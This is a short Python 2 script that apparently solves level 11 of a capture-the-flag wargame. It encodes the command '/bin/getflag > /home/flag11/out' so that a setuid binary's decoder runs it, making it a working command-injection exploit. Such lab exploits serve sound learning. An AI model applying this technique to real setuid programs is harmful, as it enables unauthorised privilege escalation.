# Generate initial encoded string to be decoded by level11 parser
# e.g. : python gen.py | /home/flag11/flag11

MAXINT=4294967296

# command string to be obtained
# first part can be any command
cmd="/bin/getflag > /home/flag11/out; echo " + "A" * 1024

# build keys array
key = [0 for i in range(0, len(cmd))]

key[0] = len(cmd) & 0xff
for i in range(1, len(cmd)):
	key[i] = key[i-1] - ord(cmd[i-1])
	if (key[i] < 0):
		key[i] += MAXINT

# build initial 'encrypted' string
a = [0 for i in range(0, len(cmd))]
for i in range(0, len(cmd)):
	a[i] = ord(cmd[i]) ^ key[i]
	# trim down to byte
	a[i] &= 0xff

print "Content-Length: " + str(len(cmd)) + "\n" + "".join([chr(i) for i in a])

# verification
for i in range (0, len(cmd)):
	a[i] ^= key[i]
	key[i] -= a[i]
	#print chr(a[i])



